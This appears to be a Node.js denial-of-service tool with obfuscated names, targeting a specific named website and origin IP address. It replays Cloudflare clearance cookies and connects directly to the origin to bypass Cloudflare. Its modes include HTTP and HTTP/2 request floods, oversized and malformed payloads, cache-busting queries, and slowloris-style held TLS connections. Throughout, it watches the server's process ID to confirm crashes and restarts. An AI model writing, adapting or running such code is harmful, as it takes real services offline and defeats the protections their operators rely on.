// fjteug iwvd
// epgretio nayqo odn
'use strict';
const https=require('https'), tls=require('tls'), zlib=require('zlib'), fs=require('fs');
const { performance } = require('perf_hooks');
try{ if(fs.existsSync('cf_cookie.txt') && !process.env.CF_COOKIE){ process.env.CF_COOKIE=fs.readFileSync('cf_cookie.txt','utf8').trim(); if(fs.existsSync('cf_ua.txt')) process.env.CF_UA=fs.readFileSync('cf_ua.txt','utf8').trim(); } }catch(e){}
const COOKIEFILE=process.env.CF_COOKIE_FILE||null, UAFILE=process.env.CF_UA_FILE||null;
const zjqxdfb=()=>{ if(COOKIEFILE){ try{ return fs.readFileSync(COOKIEFILE,'utf8').trim(); }catch(e){} } return process.env.CF_COOKIE||''; };
const zhfnat=()=>{ if(UAFILE){ try{ return fs.readFileSync(UAFILE,'utf8').trim(); }catch(e){} } return process.env.CF_UA||''; };

const zpzuth=process.argv[2]||'probe';
const zxxhd=parseInt(process.argv[3]||(zpzuth==='burst'?30:zpzuth==='zuorwbq'?100:8),10);
const zgcnwys=parseInt(process.argv[4]||'15',10);
const zdeuea=process.env.TARGET_HOST||'velor.win', zxypjp=process.env.TARGET_IP||'57.131.163.31';
const zvqbjy=process.env.LOCAL_IP||null; // optional: bind attack egress to a specific local adapter zxypjp (e.g. phone tether)
const ziyyq=parseInt(process.env.PACE_MS||'0',10);
const zdmkucj=process.env.ORIGIN_DIRECT==='1'; // bypass Cloudflare: connect straight to the origin zxypjp, SNI/Host = velor.win
const zxadd=process.env.zrqvbv||`axdjm_qndp.out`;
fs.writeFileSync(zxadd,`velor_atk ${zpzuth} w=${zxxhd} t=${zgcnwys}s ${new Date().toISOString()}\n`);
const L=s=>{console.log(s);fs.appendFileSync(zxadd,s+'\n');};

const zvktjxc = process.env.NO_KEEPALIVE==='1' ? false : new https.Agent({keepAlive:true,maxSockets:512,maxFreeSockets:512});
const zfotow=JSON.stringify({v:'a'.repeat(24),events:[{e:'x'}]});
const zhkozxc=kb=>{const b=JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:''}]}).length;
  return JSON.stringify({v:'a'.repeat(24),events:[{e:'x',p:'A'.repeat(kb*1024-b)}]});};
const zqfsdrv=zlib.gzipSync(zfotow);
const zhccz=zhkozxc(12);

function zjgxne(o={}){
  const {path='/api/health',method='GET',body=null,headers={},timeout=15000}=o;
  return new Promise(res=>{
    const t0=performance.now();
    let fin=false;
    const h={host:zdeuea,'user-zvktjxc':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36','accept-encoding':'identity','accept':'application/json, text/plain, */*','accept-language':'en-US,en;q=0.9',...headers};
    const CK0=zjqxdfb(); if(CK0){ h.cookie=CK0; const UA0=zhfnat(); if(UA0){ h['user-zvktjxc']=UA0; } }
    if(body!=null){ if(!h['content-type']&&!h['content-encoding'])h['content-type']='application/json';
      h['content-length']=Buffer.byteLength(body); }
    const done=v=>{if(fin)return;fin=true;clearTimeout(wd);res(v);};
    const opt={host:zdmkucj?zxypjp:zdeuea,port:443,path,method,zvktjxc,headers:h,localAddress:zvqbjy||undefined};
    if(zdmkucj)opt.servername=zdeuea;
    if(zvqbjy){ opt.family = zvqbjy.indexOf(':')>=0 ? 6 : 4; }
    const q=https.request(opt,s=>{
      let n=0,b=''; s.on('data',c=>{n+=c.length;if(b.length<400)b+=c;});
      s.on('end',()=>done({code:s.statusCode,ms:Math.round(performance.now()-t0),bytes:n,
        close:s.headers.connection==='close',cache:s.headers['x-velor-cache'],body:b}));
    });
    // watchdog: plain timer keeps the event loop ref'd even if the socket dies silently
    const wd=setTimeout(()=>{try{q.destroy();}catch(e){}
      done({code:'WD',ms:Math.round(performance.now()-t0),bytes:0});},timeout+500);
    // abrupt close without error/end (velor.win famously does this) -> resolve fast
    q.on('close',()=>setTimeout(()=>done({code:'ABORT',ms:Math.round(performance.now()-t0),bytes:0}),30));
    q.on('error',e=>done({code:'E:'+((e.code||'')+'').slice(0,10),ms:Math.round(performance.now()-t0),bytes:0}));
    if(body!=null)q.write(body);
    q.end();
  });
}

async function zmebf(){
  const h=await zjgxne({path:'/api/health',timeout:8000});
  const pid=(h.body||'').match(/"pid":(\d+)/); const up=(h.body||'').match(/"uptime":(\d+)/);
  L(`zmebf health ${h.code} ${h.ms}ms pid=${pid?pid[1]:'?'} uptime=${up?up[1]:'?'}s`);
  for(const [m,p] of [['GET','/api/track'],['POST','/api/track'],['GET','/api/shop'],
                      ['GET','/api/season'],['GET','/api/economy/leaderboard'],['GET','/']]){
    const r=await zjgxne({path:p,method:m,body:m==='POST'?zfotow:null,timeout:8000});
    L(`  ${m} ${p} -> ${r.code} ${r.ms}ms ${r.bytes}B cache=${r.cache||'-'}`);
  }
  return pid?pid[1]:'?';
}

function zdontj(i){
  const c=i%10;
  switch(zpzuth){
    case 'track204': case 'burst': return {path:'/api/track',method:'POST',body:zfotow};
    case 'track500': return {path:'/api/track',method:'POST',body:(process.env.RANDV==='1'?JSON.stringify({v:Array.from({length:24},()=>'0123456789abcdef'[(Math.random()*16)|0]).join(''),events:[{e:'x',p:'A'.repeat(12220)}]}):zhccz)};
    case 'trackerr':{ const r=i%3;
      if(r===0)return{path:'/api/track',method:'POST',body:'{oops'};
      if(r===1)return{path:'/api/track',method:'POST',body:'a=1',
        headers:{'content-type':'application/x-www-form-urlencoded'}};
      return{path:'/api/track',method:'POST',body:zqfsdrv,
        headers:{'content-encoding':'gzip','content-type':'application/json'}}; }
    case 'lb':   return {path:'/api/economy/leaderboard?x='+i+'-'+Math.random().toString(36).slice(2,8),method:'GET'};
    case 'shop': return {path:'/api/shop',method:'GET'};
    case 'mixed':
      if(c<5)return{path:'/api/track',method:'POST',body:zhccz};
      if(c<8)return{path:'/api/economy/leaderboard?x='+i+'-'+Math.random().toString(36).slice(2,8),method:'GET'};
      if(c<9)return{path:'/api/shop',method:'GET'};
      return{path:'/api/track',method:'POST',body:'{oops'};
    case 'static': return {path:'/robots.txt',method:'GET'};
    case 'favicon': return {path:'/favicon.png',method:'GET'};
    case 'root': return {path:'/',method:'GET'};
    case 'etk4':{ const c=i%10;
      if(c<4)return{path:'/',method:'GET'};
      if(c<7)return{path:'/api/matches',method:'GET'};
      if(c<9)return{path:'/api/leaderboard/teams',method:'GET'};
      return{path:'/api/leaderboard',method:'GET'}; }
    case 'etk3':{ const c=i%10;
      if(c<5)return{path:'/api/matches',method:'GET'};
      if(c<7)return{path:'/api/leaderboard/teams',method:'GET'};
      if(c<8)return{path:'/api/leaderboard',method:'GET'};
      return{path:'/api/auth/user',method:'GET'}; }
    case 'etk':{ const c=i%5;
      if(c<2)return{path:'/',method:'GET'};
      if(c<3)return{path:'/favicon.ico',method:'GET'};
      if(c<4)return{path:'/manifest.json',method:'GET'};
      return{path:'/apple-touch-icon.png',method:'GET'}; }
    case 'free':{ const c=i%10;
      if(c<5)return{path:'/sitemap.xml',method:'GET'};
      if(c<9)return{path:'/manifest.json',method:'GET'};
      return{path:'/favicon.ico',method:'GET'}; }
    case 'ssr':    return {path:'/',method:'GET'};
    case 'ssr2':   return {path:'/leaderboard',method:'GET'};
    case 'bundle': return {path:'/assets/index-CYtIz3va.js',method:'GET',
      headers:i%2?{'accept-encoding':'gzip'}:{'accept-encoding':'identity'}};
    case 'ws':     return {path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'};
    case 'pop':    return {path:'/api/popup/stat',method:'POST',
      body:JSON.stringify({id:'atk'+i,kind:'click'})};
    case 'writemix':{ const c=i%10;
      if(c<4)return{path:'/api/track',method:'POST',
        body:JSON.stringify({v:(i.toString(16)+'aaa').slice(0,8)+'a'.repeat(16),events:[{e:'x'}]})};
      if(c<7)return{path:'/api/popup/stat',method:'POST',
        body:JSON.stringify({id:'atk'+i,kind:'click'})};
      return{path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'}; }
    case 'melt':{ const c=i%20;
      if(c<8)return{path:'/socket.io/?EIO=4&transport=polling&x='+i,method:'GET'};
      if(c<15)return{path:'/assets/index-CYtIz3va.js?x='+i,method:'GET'};
      return{path:'/api/track',method:'POST',
        body:JSON.stringify({v:(i.toString(16)+'melt').slice(0,8)+'a'.repeat(16),events:[{e:'x'}]})}; }
    default: return {path:'/api/health',method:'GET'};
  }
}

async function zuorwbq(){
  const keep=[]; let opened=0,fail=0;
  const one=()=>new Promise(done=>{
    let fin=false;
    const s=tls.connect({host:zdmkucj?zxypjp:zdeuea,port:443,servername:zdeuea,rejectUnauthorized:false,localAddress:zvqbjy||undefined});
    const iv=setInterval(()=>{try{s.write(' ');}catch(e){}},7000);
    s.on('close',()=>clearInterval(iv));
    const end=ok=>{if(fin)return;fin=true;ok?opened++:fail++;done();};
    s.setTimeout(15000);
    s.once('secureConnect',()=>{
      const CK0=zjqxdfb(); const CK=CK0?('Cookie: '+CK0+'\r\n'):'';
      s.write('POST /api/track HTTP/1.1\r\nHost: velor.win\r\nUser-Agent: '+(process.env.CF_UA||'atk-zuorwbq/1')+'\r\n'+
        'Content-Type: application/json\r\n'+CK+'Content-Length: 2097152\r\nConnection: keep-alive\r\n\r\n{');
      keep.push(s); end(true);
    });
    s.once('error',()=>end(false));
    s.once('timeout',()=>end(false));
  });
  const gap=Math.max(0,15000/zxxhd);
  for(let i=0;i<zxxhd;i++){ one(); if(gap>1)await new Promise(r=>setTimeout(r,gap)); }
  L(`zuorwbq: attempted=${zxxhd} opened=${opened} failed=${fail}`);
  const t=setInterval(async()=>{const alive=keep.filter(s=>!s.destroyed).length;
    const p=await zjgxne({path:'/api/health',timeout:8000});
    L(`  held=${alive} health=${p.code}/${p.ms}ms`);},5000);
  await new Promise(r=>setTimeout(r,zgcnwys*1000));
  clearInterval(t);
  keep.forEach(s=>{try{s.destroy();}catch(e){}});
  await new Promise(r=>setTimeout(r,2000));
  const p=await zjgxne({path:'/api/health',timeout:8000}); L(`post-release health ${p.code} ${p.ms}ms`);
}

async function zybbph(){
  const http2=require('http2');
  const endAt=Date.now()+zgcnwys*1000; let sent=0,abort=0; const codes={};
  const worker=async()=>{
    let conn=null;
    const ready=()=>new Promise(r=>{conn=http2.connect(zdmkucj?'https://'+zxypjp:'https://velor.win',{servername:zdeuea,localAddress:zvqbjy||undefined});conn.once('connect',r);conn.once('error',r);});
    await ready();
    while(Date.now()<endAt){
      const t0w=Date.now();
      try{
        sent++;
        const st=conn.request({':method':'POST',':path':'/api/track',':authority':zdeuea,'content-type':'application/json','user-zvktjxc':zhfnat()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(zjqxdfb()?{cookie:zjqxdfb()}:{})});
        const p=new Promise(res=>{st.on('response',h=>{st.resume();res(h[':status']);});st.on('error',()=>res('E'));st.on('close',()=>res('ABORT'));});
        st.write(zpzuth==='h2trk'?zhccz:zfotow); st.end();
        const c=await p; codes[c]=(codes[c]||0)+1;
        if(c==='E'||c==='ABORT'){abort++;try{conn.close();}catch(e){} await ready();}
      }catch(e){abort++;try{conn.close();}catch(_){} await ready();}
      if(ziyyq>0){const el=Date.now()-t0w; if(el<ziyyq)await new Promise(r=>setTimeout(r,ziyyq-el));}
    }
    try{conn.close();}catch(e){}
  };
  const mon=setInterval(async()=>{const p=await zjgxne({path:'/api/health',timeout:8000});L(`  t+${zgcnwys-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
  await Promise.all(Array.from({length:zxxhd},(_,w)=>worker(w)));
  clearInterval(mon);
  L(`h2 sent=${sent} (${(sent/zgcnwys).toFixed(1)}/s) codes=${JSON.stringify(codes)} aborts=${abort}`);
}

(async()=>{
  L(`== velor_atk ${zpzuth} - ${zxxhd} workers ${zgcnwys}s ==`);
  const pid0=await zmebf();
  if(zpzuth==='probe'){L('done');return;}
  if(zpzuth==='zuorwbq'){await zuorwbq();L('done');return;}
  if(zpzuth==='h2'||zpzuth==='h2trk'){await zybbph();const p1=await zmebf();L(pid0===p1?'pid stable':(p1==='?'?'pid unreadable at post-check (health no-answer)':'PID CHANGED '+pid0+'->'+p1));L('done');return;}
  const endAt=Date.now()+zgcnwys*1000; let sent=0,closes=0; const codes={}; let first429=null;
  const mon=setInterval(async()=>{const p=await zjgxne({path:'/api/health',timeout:8000});
    L(`  t+${zgcnwys-Math.round((endAt-Date.now())/1000)}s health=${p.code}/${p.ms}ms`);},5000);
  const st=setInterval(()=>{L(`  stats sent=${sent} codes=${JSON.stringify(codes)} closes=${closes}`);},30000);
  const worker=async w=>{let i=0;while(Date.now()<endAt){
    const t0w=Date.now(); const r=await zjgxne(zdontj(w*9973+i++)); sent++;
    codes[r.code]=(codes[r.code]||0)+1; if(r.close)closes++;
    if(r.code===429&&first429===null)first429=sent; if(ziyyq>0){const el=Date.now()-t0w; if(el<ziyyq)await new Promise(rr=>setTimeout(rr,ziyyq-el));}}};
  await Promise.all(Array.from({length:zxxhd},(_,w)=>worker(w)));
  clearInterval(mon);clearInterval(st);
  L(`sent=${sent} (${(sent/zgcnwys).toFixed(1)}/s) codes=${JSON.stringify(codes)} conn-close=${closes} first429@zjgxne=${first429??'-'}`);
  const pid1=await zmebf();
  L(pid0===pid1?`pid stable (${pid0}) - no restart`:(pid1==='?'?`pid unreadable at post-check (health no-answer); zmebf pid was ${pid0}`:`PID CHANGED ${pid0} -> ${pid1} - app restarted!`));
  L('done');
})().catch(e=>L('FATAL '+e.message));

// vmwcg-wvcfenk
